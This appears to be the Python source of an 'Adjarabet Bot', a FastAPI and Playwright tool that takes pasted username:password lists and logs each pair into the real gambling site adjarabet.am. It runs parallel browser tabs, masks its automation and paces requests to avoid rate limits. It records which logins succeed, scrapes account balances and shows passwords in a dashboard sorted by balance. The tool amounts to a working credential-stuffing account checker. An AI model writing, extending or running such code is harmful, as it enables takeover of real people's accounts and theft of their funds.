import asyncio
import json
import logging
import os
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import List, Dict, Optional
from contextlib import asynccontextmanager
from collections import deque
import time

import aiofiles
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

CONFIG = {
    "port": int(os.getenv("PORT", 8000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "headless": os.getenv("HEADLESS", "True").lower() == "true",
    "timeout_nav": int(os.getenv("TIMEOUT_NAV", 15000)),
    "timeout_element": int(os.getenv("TIMEOUT_ELEMENT", 5000)),
    "max_retries": int(os.getenv("MAX_RETRIES", 1)),
    "concurrent_limit": int(os.getenv("CONCURRENT_LIMIT", 4)),  # REAL concurrent tabs!
    "delay_between": float(os.getenv("DELAY_BETWEEN", 0.3)),
}

logging.basicConfig(
    level=getattr(logging, os.getenv("LOG_LEVEL", "INFO")),
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("AdjarabetBot")

class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"

@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = "0 ֏"
    balance_value: float = 0.0
    error: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "balance": self.balance,
            "balance_value": self.balance_value,
            "status": self.status.value,
            "error": self.error[:80],
            "timestamp": self.timestamp
        }

class ConnectionManager:
    def __init__(self):
        self.active: List[WebSocket] = []

    async def connect(self, ws: WebSocket):
        await ws.accept()
        self.active.append(ws)

    def disconnect(self, ws: WebSocket):
        if ws in self.active:
            self.active.remove(ws)

    async def broadcast(self, msg: str):
        dead = []
        for ws in self.active:
            try:
                await ws.send_text(msg)
            except:
                dead.append(ws)
        for ws in dead:
            self.disconnect(ws)

class RateLimiter:
    __slots__ = ('max_req', 'window', 'timestamps')
    def __init__(self, max_req: int = 5, window: float = 10.0):
        self.max_req = max_req
        self.window = window
        self.timestamps = deque()
    
    async def acquire(self):
        now = time.time()
        while self.timestamps and self.timestamps[0] < now - self.window:
            self.timestamps.popleft()
        if len(self.timestamps) >= self.max_req:
            wait = self.window - (now - self.timestamps[0])
            if wait > 0:
                await asyncio.sleep(wait)
        self.timestamps.append(time.time())

class Bot:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.results: List[Account] = []
        self.all_accounts: List[Account] = []
        self.current_index = 0
        self.semaphore = None  # Will be initialized after browser is ready
        self.rate_limiter = RateLimiter()
        self._running = False
        self._stop_flag = False
        self._processing_task: Optional[asyncio.Task] = None

    async def init(self):
        logger.info("Starting browser...")
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(
            headless=CONFIG["headless"],
            args=[
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage', 
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled'
            ]
        )
        self.semaphore = asyncio.Semaphore(CONFIG["concurrent_limit"])
        self._running = True
        logger.info(f"✓ Browser ready | Concurrent tabs: {CONFIG['concurrent_limit']}")
        return True

    async def cleanup(self):
        self._running = False
        if self._processing_task and not self._processing_task.done():
            self._processing_task.cancel()
        if self.browser:
            try:
                await self.browser.close()
            except:
                pass
        if self.playwright:
            try:
                await self.playwright.stop()
            except:
                pass

    def _parse_balance(self, text: str) -> tuple:
        try:
            text = text.replace(',', '').replace('֏', '').replace('GEL', '').replace('₾', '').strip()
            m = re.search(r'(\d+(?:\.\d+)?)', text)
            if m:
                val = float(m.group(1))
                return f"{val:,.2f} ֏", val
        except:
            pass
        return "0 ֏", 0.0

    async def _login_one(self, acc: Account, worker_id: int) -> Account:
        """Process single account with its own context - REAL concurrent!"""
        ctx = None
        page = None
        try:
            await self.rate_limiter.acquire()
            
            logger.info(f"[Worker {worker_id}] 🔄 Processing: {acc.username}")
            
            # Each account gets its OWN independent context (REAL tab!)
            ctx = await self.browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                ignore_https_errors=True
            )
            page = await ctx.new_page()
            page.set_default_timeout(CONFIG["timeout_nav"])
            
            for attempt in range(CONFIG["max_retries"] + 1):
                if not self._running or self._stop_flag:
                    return acc
                try:
                    # Go to login page
                    await page.goto('https://www.adjarabet.am/hy', wait_until='domcontentloaded')
                    await asyncio.sleep(0.5)
                    
                    # Check if already logged in
                    try:
                        bal_el = await page.wait_for_selector('[data-test-id="header-user-balance"]', timeout=2000)
                        if bal_el:
                            txt = await bal_el.inner_text()
                            acc.balance, acc.balance_value = self._parse_balance(txt)
                            acc.status = AccountStatus.SUCCESS
                            logger.info(f"[Worker {worker_id}] ✅ Already logged in: {acc.username} | Balance: {acc.balance}")
                            return acc
                    except:
                        pass
                    
                    # Fill login form
                    await page.fill('input[name="userIdentifier"]', acc.username, timeout=CONFIG["timeout_element"])
                    await page.fill('input[type="password"]', acc.password, timeout=CONFIG["timeout_element"])
                    await page.click('[data-test-id="header-login-button"]')
                    
                    # Wait for balance to appear
                    bal_el = await page.wait_for_selector('[data-test-id="header-user-balance"]', timeout=CONFIG["timeout_nav"])
                    txt = await bal_el.inner_text()
                    acc.balance, acc.balance_value = self._parse_balance(txt)
                    acc.status = AccountStatus.SUCCESS
                    logger.info(f"[Worker {worker_id}] ✅ Login success: {acc.username} | Balance: {acc.balance}")
                    return acc
                    
                except PlaywrightTimeout:
                    if attempt == CONFIG["max_retries"]:
                        acc.status = AccountStatus.TIMEOUT
                        acc.error = "Response timeout"
                        logger.warning(f"[Worker {worker_id}] ⏰ Timeout: {acc.username}")
                    else:
                        await asyncio.sleep(1.5)
                        continue
                except Exception as e:
                    if attempt == CONFIG["max_retries"]:
                        acc.status = AccountStatus.FAILED
                        acc.error = str(e)[:60]
                        logger.warning(f"[Worker {worker_id}] ❌ Failed: {acc.username} | {str(e)[:50]}")
                    else:
                        await asyncio.sleep(1.5)
                        continue
            return acc
            
        except Exception as e:
            acc.status = AccountStatus.FAILED
            acc.error = str(e)[:60]
            logger.error(f"[Worker {worker_id}] ❌ Exception: {acc.username} | {str(e)[:50]}")
            return acc
        finally:
            if page:
                try:
                    await page.close()
                except:
                    pass
            if ctx:
                try:
                    await ctx.close()
                except:
                    pass

    async def _worker(self, acc: Account, worker_id: int, manager: ConnectionManager):
        """Worker for single account - runs in semaphore for concurrency control"""
        async with self.semaphore:
            if self._stop_flag:
                return acc
            result = await self._login_one(acc, worker_id)
            self.results.append(result)
            self.current_index += 1
            await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
            await manager.broadcast(f"PROGRESS:{self.current_index}/{len(self.all_accounts)}")
            return result

    async def start(self, accounts: List[Account], manager: ConnectionManager):
        """Start or resume processing with REAL concurrent tabs"""
        # Check if we're resuming
        if self.all_accounts and self.current_index > 0 and self.current_index < len(self.all_accounts):
            logger.info(f"▶ RESUMING from account {self.current_index + 1}/{len(self.all_accounts)}")
            await manager.broadcast(f"STATUS:resuming from {self.current_index + 1}")
        else:
            self.all_accounts = accounts.copy()
            self.results = []
            self.current_index = 0
            logger.info(f"▶ FRESH START: {len(accounts)} accounts")
            await manager.broadcast(f"STATUS:started")
        
        total = len(self.all_accounts)
        start_time = time.time()
        self._stop_flag = False
        self._running = True
        
        await manager.broadcast(f"PROGRESS:{self.current_index}/{total}")

        # Get remaining accounts
        remaining_accounts = self.all_accounts[self.current_index:]
        
        if not remaining_accounts:
            logger.info("No accounts to process")
            await manager.broadcast("STATUS:completed")
            self._running = False
            return
        
        # Process accounts with REAL concurrency!
        logger.info(f"🚀 Starting concurrent processing with {CONFIG['concurrent_limit']} tabs")
        
        # Create tasks for all remaining accounts (semaphore will limit concurrency)
        tasks = []
        for i, acc in enumerate(remaining_accounts):
            if self._stop_flag:
                break
            worker_id = (self.current_index + i) % CONFIG["concurrent_limit"]
            task = asyncio.create_task(self._worker(acc, worker_id, manager))
            tasks.append(task)
            
            # Small delay between starting tasks to avoid rate limiting
            await asyncio.sleep(CONFIG["delay_between"])
        
        # Wait for all tasks to complete
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        if not self._stop_flag:
            await self._save_results()
            
            elapsed = time.time() - start_time
            success = sum(1 for r in self.results if r.status == AccountStatus.SUCCESS)
            fail = sum(1 for r in self.results if r.status == AccountStatus.FAILED)
            to = sum(1 for r in self.results if r.status == AccountStatus.TIMEOUT)
            
            rate_per_sec = len(self.results) / elapsed if elapsed > 0 else 0
            logger.info(f"📊 Complete: {elapsed:.1f}s | {rate_per_sec:.2f} acc/sec | ✅{success} ❌{fail} ⏰{to}")
            await manager.broadcast(f"SUMMARY:{success}/{len(self.results)}:{success/len(self.results)*100:.1f}")
            await manager.broadcast("STATUS:completed")
        
        self._running = False

    async def stop(self):
        """Stop current processing"""
        self._stop_flag = True
        await manager.broadcast("STATUS:stopped")
        logger.info(f"⏹ Stopped at account {self.current_index}/{len(self.all_accounts)}")

    async def reset(self):
        """Reset everything - fresh start on next run"""
        self.all_accounts = []
        self.results = []
        self.current_index = 0
        self._stop_flag = False
        self._running = False
        Path("results/results.json").unlink(missing_ok=True)
        logger.info("🔄 Bot reset - fresh start ready")

    async def clear_results(self):
        """Clear only results table, keep accounts"""
        self.results = []
        self.current_index = 0
        Path("results/results.json").unlink(missing_ok=True)
        logger.info("🗑 Results cleared")

    async def _save_results(self):
        try:
            Path("results").mkdir(exist_ok=True)
            data = [r.to_dict() for r in self.results]
            async with aiofiles.open("results/results.json", "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2, ensure_ascii=False))
        except Exception as e:
            logger.error(f"Save error: {e}")

    async def get_results(self) -> List[Dict]:
        if self.results:
            return [r.to_dict() for r in self.results]
        try:
            p = Path("results/results.json")
            if p.exists():
                async with aiofiles.open(p, "r", encoding="utf-8") as f:
                    return json.loads(await f.read())
        except:
            pass
        return []

manager = ConnectionManager()
bot = Bot()
processing_task: Optional[asyncio.Task] = None

async def retry_single_account(acc: Account):
    try:
        result = await bot._login_one(acc, 99)  # worker_id=99 for retry
        
        existing_index = None
        for i, r in enumerate(bot.results):
            if r.username == result.username:
                existing_index = i
                break
        
        if existing_index is not None:
            bot.results[existing_index] = result
        else:
            bot.results.append(result)
        
        for i, a in enumerate(bot.all_accounts):
            if a.username == result.username:
                bot.all_accounts[i] = result
                break
        
        await bot._save_results()
        await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
        logger.info(f"🔄 Retry completed for {result.username}: {result.status.value}")
        return result
    except Exception as e:
        logger.error(f"Retry failed for {acc.username}: {e}")
        return None

HTML_UI = '''<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adjarabet Bot | Concurrent v26.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: linear-gradient(135deg, #0a0c10 0%, #0d1117 100%); color: #e6edf3; font-family: 'Inter', sans-serif; padding: 20px; min-height: 100vh; }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, rgba(22,27,34,0.95), rgba(13,17,23,0.95)); backdrop-filter: blur(10px); border-radius: 20px; padding: 14px 24px; margin-bottom: 20px; border: 1px solid rgba(48,54,61,0.5); text-align: center; }
        .header h1 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #58a6ff, #3fb950, #f0883e); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .header-sub { font-size: 12px; color: #8b949e; margin-top: 4px; }
        .progress-bar { height: 2px; background: #21262d; border-radius: 2px; overflow: hidden; margin-top: 10px; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #3fb950, #58a6ff); width: 0%; transition: width 0.3s ease; }
        
        .stats-top { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 20px; }
        .stat-card { background: #161b22; border-radius: 14px; padding: 10px 12px; text-align: center; cursor: pointer; border: 1px solid #30363d; transition: all 0.2s; }
        .stat-card:hover { transform: translateY(-1px); border-color: #58a6ff; background: #1a1f2e; }
        .stat-number { font-size: 22px; font-weight: 700; color: #58a6ff; }
        .stat-label { font-size: 10px; color: #8b949e; margin-top: 3px; font-weight: 500; }
        
        .results-section { background: #161b22; border-radius: 20px; border: 1px solid #30363d; overflow: hidden; margin-bottom: 20px; }
        .section-header { padding: 14px 20px; background: #0d1117; border-bottom: 1px solid #30363d; font-weight: 600; font-size: 15px; }
        .section-header i { color: #58a6ff; margin-right: 8px; }
        
        .filter-bar { display: flex; gap: 10px; padding: 12px 20px; background: #0d1117; border-bottom: 1px solid #21262d; flex-wrap: wrap; align-items: center; }
        .search-input { padding: 6px 14px; background: #010409; border: 1px solid #30363d; border-radius: 30px; color: white; width: 220px; font-size: 12px; }
        .search-input:focus { outline: none; border-color: #58a6ff; }
        .filter-btn { padding: 5px 14px; background: #21262d; border: none; border-radius: 30px; color: #8b949e; cursor: pointer; font-size: 11px; font-weight: 500; }
        .filter-btn.active { background: #58a6ff; color: white; }
        .filter-btn:hover:not(.active) { background: #30363d; color: #e6edf3; }
        .balance-filter { display: flex; gap: 6px; margin-left: auto; }
        .balance-filter-btn { padding: 4px 10px; background: #21262d; border: none; border-radius: 30px; color: #8b949e; cursor: pointer; font-size: 10px; }
        .balance-filter-btn.active { background: #3fb950; color: white; }
        
        .table-container { max-height: 520px; overflow-y: auto; }
        table { width: 100%; border-collapse: separate; border-spacing: 0; }
        th { background: #0d1117; padding: 12px 14px; text-align: left; font-size: 12px; font-weight: 600; color: #8b949e; cursor: pointer; position: sticky; top: 0; border-bottom: 1px solid #30363d; }
        th:hover { color: #58a6ff; }
        td { padding: 10px 14px; font-size: 12px; border-bottom: 1px solid #21262d; }
        tr:last-child td { border-bottom: none; }
        .balance-positive { color: #3fb950; font-weight: 600; }
        .balance-medium { color: #d29922; font-weight: 600; }
        .balance-zero { color: #f85149; }
        
        .copy-btn, .retry-btn { background: transparent; border: none; cursor: pointer; font-size: 11px; padding: 3px 8px; border-radius: 6px; transition: all 0.2s; display: inline-flex; align-items: center; gap: 4px; }
        .copy-btn { color: #58a6ff; margin-left: 8px; }
        .copy-btn:hover { background: #30363d; color: #3fb950; }
        .retry-btn { color: #d29922; margin-left: 8px; }
        .retry-btn:hover { background: #30363d; color: #f0883e; }
        
        .username-cell, .password-cell { display: flex; align-items: center; justify-content: space-between; gap: 6px; flex-wrap: wrap; }
        .error-cell { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 6px; }
        
        .bottom-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 0; }
        .card { background: #161b22; border-radius: 20px; border: 1px solid #30363d; overflow: hidden; }
        .card-header { padding: 12px 18px; background: #0d1117; border-bottom: 1px solid #30363d; font-weight: 600; font-size: 13px; }
        .card-header i { color: #58a6ff; margin-right: 6px; }
        textarea { width: 100%; min-height: 200px; background: #010409; border: none; padding: 14px; color: #e6edf3; font-family: 'Courier New', monospace; font-size: 11px; resize: vertical; }
        textarea:focus { outline: none; background: #0a0c10; }
        .button-group { padding: 14px; display: flex; gap: 8px; flex-wrap: wrap; border-top: 1px solid #21262d; }
        .btn { padding: 6px 16px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.2s; font-size: 12px; }
        .btn-primary { background: linear-gradient(135deg, #238636, #2ea043); color: white; }
        .btn-primary:hover { transform: translateY(-1px); }
        .btn-danger { background: linear-gradient(135deg, #da3633, #f85149); color: white; }
        .btn-danger:hover { transform: translateY(-1px); }
        .btn-secondary { background: #6e7681; color: white; }
        .btn-secondary:hover { background: #8b949e; }
        .btn-warning { background: #d29922; color: #0a0c10; }
        .btn-warning:hover { background: #f0883e; }
        .btn-info { background: #1f6feb; color: white; }
        .btn-info:hover { background: #388bfd; }
        
        .terminal { background: #010409; height: 280px; overflow-y: auto; padding: 10px; font-family: 'Courier New', monospace; font-size: 10px; }
        .terminal-line { padding: 4px 0; color: #b1bac4; border-bottom: 1px solid #1a1f2e; }
        .terminal-line .time { color: #58a6ff; margin-right: 10px; }
        
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #161b22; border-radius: 3px; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #58a6ff; }
        
        @media (max-width: 900px) {
            body { padding: 12px; }
            .bottom-grid { grid-template-columns: 1fr; }
            .stats-top { grid-template-columns: repeat(2, 1fr); }
            .balance-filter { margin-left: 0; margin-top: 8px; }
            .filter-bar { flex-direction: column; align-items: stretch; }
            .search-input { width: 100%; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><i class="fas fa-crown"></i> Adjarabet Bot v26.0 | Concurrent Mode</h1>
        <div class="header-sub">⚡ REAL CONCURRENT TABS: 3 accounts simultaneously | Stop → Start resumes</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    </div>

    <div class="stats-top">
        <div class="stat-card" onclick="setFilter('all')"><div class="stat-number" id="totalCount">0</div><div class="stat-label">TOTAL</div></div>
        <div class="stat-card" onclick="setFilter('success')"><div class="stat-number" id="successCount">0</div><div class="stat-label">✅ SUCCESS</div></div>
        <div class="stat-card" onclick="setFilter('failed')"><div class="stat-number" id="failedCount">0</div><div class="stat-label">❌ FAILED</div></div>
        <div class="stat-card" onclick="setFilter('timeout')"><div class="stat-number" id="timeoutCount">0</div><div class="stat-label">⏰ TIMEOUT</div></div>
    </div>

    <div class="results-section">
        <div class="section-header"><i class="fas fa-chart-line"></i> Results Dashboard <span style="font-size: 10px; color: #6e7681;">▼ Click headers to sort | 📋 Copy | ⟳ Retry</span></div>
        <div class="filter-bar">
            <input type="text" id="searchInput" class="search-input" placeholder="🔍 Search username...">
            <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">All</button>
            <button class="filter-btn" data-filter="success" onclick="setFilter('success')">✅ Success</button>
            <button class="filter-btn" data-filter="failed" onclick="setFilter('failed')">❌ Failed</button>
            <button class="filter-btn" data-filter="timeout" onclick="setFilter('timeout')">⏰ Timeout</button>
            <div class="balance-filter">
                <span style="font-size: 10px; color: #8b949e;">💰</span>
                <button class="balance-filter-btn active" data-balance="all" onclick="setBalanceFilter('all')">All</button>
                <button class="balance-filter-btn" data-balance="low" onclick="setBalanceFilter('low')">&lt;10</button>
                <button class="balance-filter-btn" data-balance="mid" onclick="setBalanceFilter('mid')">10-100</button>
                <button class="balance-filter-btn" data-balance="high" onclick="setBalanceFilter('high')">100+</button>
            </div>
        </div>
        <div class="table-container">
            <table id="resultsTable">
                <thead><tr><th onclick="sortBy('status')"><i class="fas fa-flag"></i> Status</th><th onclick="sortBy('username')"><i class="fas fa-user"></i> Username</th><th onclick="sortBy('password')"><i class="fas fa-key"></i> Password</th><th onclick="sortBy('balance')"><i class="fas fa-coins"></i> Balance</th><th>Action</th></tr></thead>
                <tbody id="resultsBody"><tr><td colspan="5" style="text-align:center; padding:40px;"><i class="fas fa-spinner fa-pulse"></i> Waiting...</td></tr></tbody>
            </table>
        </div>
    </div>

    <div class="bottom-grid">
        <div class="card">
            <div class="card-header"><i class="fas fa-users"></i> Accounts Input (username:password)</div>
            <textarea id="accounts" placeholder="user1:pass123&#10;user2:pass456&#10;user3:pass789"></textarea>
            <div class="button-group">
                <button class="btn btn-primary" onclick="startBot()"><i class="fas fa-play"></i> Start / Resume</button>
                <button class="btn btn-danger" onclick="stopBot()"><i class="fas fa-stop"></i> Stop</button>
                <button class="btn btn-warning" onclick="resetBot()"><i class="fas fa-bomb"></i> Reset All</button>
                <button class="btn btn-info" onclick="clearResultsOnly()"><i class="fas fa-eraser"></i> Clear Results</button>
                <button class="btn btn-secondary" onclick="clearTerminal()"><i class="fas fa-trash"></i> Clear Terminal</button>
            </div>
        </div>
        <div class="card">
            <div class="card-header"><i class="fas fa-terminal"></i> Live Console</div>
            <div class="terminal" id="terminal">
                <div class="terminal-line"><span class="time">●</span> 🚀 Bot ready v26.0 - CONCURRENT MODE</div>
                <div class="terminal-line"><span class="time">●</span> 💡 {CONFIG['concurrent_limit']} tabs open simultaneously!</div>
                <div class="terminal-line"><span class="time">●</span> 🔄 Stop → Start resumes from EXACT position</div>
            </div>
        </div>
    </div>
</div>

<script>
let ws = null, allResults = [], currentFilter = 'all', currentBalanceFilter = 'all', currentSort = { field: 'balance', dir: 'desc' };

function connect() {
    ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host + '/ws');
    ws.onopen = () => addLog('🟢 Connected');
    ws.onmessage = (e) => {
        let data = e.data;
        if (data.startsWith('RESULT:')) {
            try {
                let result = JSON.parse(data.substring(7));
                let idx = allResults.findIndex(x => x.username === result.username);
                idx >= 0 ? allResults[idx] = result : allResults.push(result);
                renderResults(); updateStats();
                addLog(`${result.status} ${result.username.padEnd(18)} | ${result.balance}`);
            } catch(e) {}
        } else if (data.startsWith('PROGRESS:')) {
            let p = data.substring(9).split('/');
            document.getElementById('progressFill').style.width = (p[0]/p[1]*100) + '%';
        } else if (data.startsWith('SUMMARY:')) {
            addLog('📊 ' + data.substring(8));
        } else if (data.startsWith('STATUS:resuming')) {
            addLog('🔄 ' + data.substring(14));
        } else if (data.startsWith('STATUS:completed')) {
            addLog('✅ Bot completed all accounts!');
        } else if (!data.startsWith('STATUS:')) addLog(data);
    };
    ws.onclose = () => { addLog('🔴 Reconnecting...'); setTimeout(connect, 3000); };
}

async function copyToClipboard(text, type, btnElement) {
    try {
        await navigator.clipboard.writeText(text);
        let original = btnElement.innerHTML;
        btnElement.innerHTML = '<i class="fas fa-check"></i> ✓';
        addLog(`📋 Copied ${type}: ${text.substring(0, 25)}${text.length > 25 ? '...' : ''}`);
        setTimeout(() => { btnElement.innerHTML = original; }, 1500);
    } catch(err) {
        let textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        addLog(`📋 Copied ${type}: ${text.substring(0, 25)}${text.length > 25 ? '...' : ''}`);
        let original = btnElement.innerHTML;
        btnElement.innerHTML = '<i class="fas fa-check"></i> ✓';
        setTimeout(() => { btnElement.innerHTML = original; }, 1500);
    }
}

async function retryAccount(username) {
    addLog(`🔄 Retrying: ${username}...`);
    try {
        let res = await fetch(`/retry/${encodeURIComponent(username)}`, { method: 'POST' });
        let data = await res.json();
        addLog(data.status === 'retry_started' ? `✓ Retry started for ${username}` : `❌ Retry failed: ${data.error}`);
    } catch(e) { addLog(`❌ Retry error: ${e.message}`); }
}

function renderResults() {
    let filtered = allResults.filter(r => {
        if(currentFilter !== 'all') {
            if(currentFilter === 'success' && r.status !== '✅') return false;
            if(currentFilter === 'failed' && r.status !== '❌') return false;
            if(currentFilter === 'timeout' && r.status !== '⏰') return false;
        }
        if(currentBalanceFilter !== 'all') {
            let num = parseFloat(r.balance_value) || 0;
            if(currentBalanceFilter === 'low' && num >= 10) return false;
            if(currentBalanceFilter === 'mid' && (num < 10 || num > 100)) return false;
            if(currentBalanceFilter === 'high' && num <= 100) return false;
        }
        return true;
    });
    let search = document.getElementById('searchInput')?.value.toLowerCase() || '';
    if(search) filtered = filtered.filter(r => r.username.toLowerCase().includes(search));
    filtered.sort((a,b) => {
        let av = currentSort.field === 'balance' ? (a.balance_value || 0) : (a[currentSort.field] || '').toString().toLowerCase();
        let bv = currentSort.field === 'balance' ? (b.balance_value || 0) : (b[currentSort.field] || '').toString().toLowerCase();
        if(typeof av === 'number') return currentSort.dir === 'asc' ? av - bv : bv - av;
        return currentSort.dir === 'asc' ? (av > bv ? 1 : -1) : (av < bv ? 1 : -1);
    });
    let balanceClass = (v) => { let n = parseFloat(v)||0; return n>100?'balance-positive':n>10?'balance-medium':'balance-zero'; };
    document.getElementById('resultsBody').innerHTML = filtered.map(r => `<tr><td style="font-size:18px">${r.status}</td><td><div class="username-cell"><strong style="color:#58a6ff">${escapeHtml(r.username)}</strong><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(r.username).replace(/'/g,"\\'")}','username',this)"><i class="fas fa-copy"></i></button></div></td><td><div class="password-cell">${escapeHtml(r.password)}<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(r.password).replace(/'/g,"\\'")}','password',this)"><i class="fas fa-key"></i></button></div></td><td class="${balanceClass(r.balance_value)}">${r.balance||'0 ֏'}</td><td class="error-cell">${escapeHtml(r.error||'-')}<button class="retry-btn" onclick="retryAccount('${escapeHtml(r.username).replace(/'/g,"\\'")}')"><i class="fas fa-sync-alt"></i> Retry</button></div></td></tr>`).join('');
    if(filtered.length===0 && allResults.length>0) document.getElementById('resultsBody').innerHTML='<tr><td colspan="5" style="text-align:center;padding:40px"><i class="fas fa-search"></i> No results</td></tr>';
}

function updateStats() {
    document.getElementById('totalCount').innerText = allResults.length;
    document.getElementById('successCount').innerText = allResults.filter(r=>r.status==='✅').length;
    document.getElementById('failedCount').innerText = allResults.filter(r=>r.status==='❌').length;
    document.getElementById('timeoutCount').innerText = allResults.filter(r=>r.status==='⏰').length;
}

function sortBy(field) {
    if(currentSort.field === field) currentSort.dir = currentSort.dir==='asc'?'desc':'asc';
    else { currentSort.field = field; currentSort.dir = field==='balance'?'desc':'asc'; }
    renderResults();
}
function setFilter(f) { currentFilter = f; document.querySelectorAll('.filter-btn').forEach(btn=>btn.classList.toggle('active',btn.dataset.filter===f)); renderResults(); }
function setBalanceFilter(f) { currentBalanceFilter = f; document.querySelectorAll('.balance-filter-btn').forEach(btn=>btn.classList.toggle('active',btn.dataset.balance===f)); renderResults(); }
function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
function addLog(msg) { let term=document.getElementById('terminal'); let div=document.createElement('div'); div.className='terminal-line'; div.innerHTML=`<span class="time">[${new Date().toLocaleTimeString()}]</span> ${msg}`; term.appendChild(div); if(term.children.length>300) term.removeChild(term.firstChild); }
function clearTerminal() { document.getElementById('terminal').innerHTML = '<div class="terminal-line"><span class="time">●</span> 🧹 Terminal cleared</div>'; }

async function startBot() { 
    let acc = document.getElementById('accounts').value; 
    if(!acc.trim()){ addLog('❌ Enter accounts'); return; } 
    addLog('🚀 Starting with CONCURRENT mode...'); 
    try{
        let res=await fetch('/start',{method:'POST',body:acc}); 
        let data=await res.json(); 
        if(data.status==='started') addLog(`✓ Started ${data.total} accounts (${CONFIG['concurrent_limit']} concurrent tabs)`);
    }catch(e){ addLog('❌ '+e.message);} 
}

async function stopBot() { 
    addLog('⏹ Stopping... (will resume from this exact position)'); 
    await fetch('/stop',{method:'POST'}); 
}

async function resetBot() {
    if(confirm('⚠️ RESET EVERYTHING? This will clear all results and start fresh!')){
        await fetch('/reset',{method:'POST'});
        allResults=[]; renderResults(); updateStats();
        document.getElementById('accounts').value = '';
        localStorage.removeItem('bot_accounts');
        addLog('🔄 BOT RESET - Next start will begin from first account');
    }
}

async function clearResultsOnly() {
    if(confirm('🗑 Clear results table only?')){
        await fetch('/clear-results',{method:'POST'});
        allResults=[]; renderResults(); updateStats();
        addLog('🗑 Results cleared');
    }
}

document.getElementById('accounts').value = localStorage.getItem('bot_accounts') || '';
document.getElementById('accounts').addEventListener('input',()=>localStorage.setItem('bot_accounts',document.getElementById('accounts').value));
document.getElementById('searchInput').addEventListener('input',()=>renderResults());
connect();
setInterval(async()=>{try{let r=await fetch('/results');let d=await r.json();if(JSON.stringify(d)!==JSON.stringify(allResults)){allResults=d;renderResults();updateStats();}}catch(e){}},5000);
</script>
</body>
</html>'''

@asynccontextmanager
async def lifespan(app: FastAPI):
    await bot.init()
    logger.info("=" * 50)
    logger.info("🎮 ADJARABET BOT v26.0 - CONCURRENT MODE")
    logger.info(f"📍 Host: {CONFIG['host']}:{CONFIG['port']}")
    logger.info(f"⚡ REAL Concurrent tabs: {CONFIG['concurrent_limit']}")
    logger.info(f"🔧 Headless: {CONFIG['headless']} | Timeout: {CONFIG['timeout_nav']}ms")
    logger.info("✅ Stop → Start resumes from EXACT position")
    logger.info("✅ Each account gets INDEPENDENT browser tab")
    logger.info("=" * 50)
    yield
    await bot.cleanup()

app = FastAPI(title="Adjarabet Bot Concurrent", version="26.0", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def root():
    return HTMLResponse(HTML_UI)

@app.post("/start")
async def start_bot(req: Request):
    global processing_task
    body = (await req.body()).decode()
    accounts = []
    for line in body.splitlines():
        line = line.strip()
        if line and not line.startswith('#') and ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                accounts.append(Account(parts[0].strip(), parts[1].strip()))
    if not accounts:
        return JSONResponse({"error": "No valid accounts (format: username:password)"}, 400)
    
    if processing_task and not processing_task.done():
        processing_task.cancel()
        await asyncio.sleep(0.5)
    
    processing_task = asyncio.create_task(bot.start(accounts, manager))
    return {"status": "started", "total": len(accounts)}

@app.post("/stop")
async def stop_bot():
    await bot.stop()
    return {"status": "stopped"}

@app.post("/reset")
async def reset_bot():
    await bot.reset()
    return {"status": "reset"}

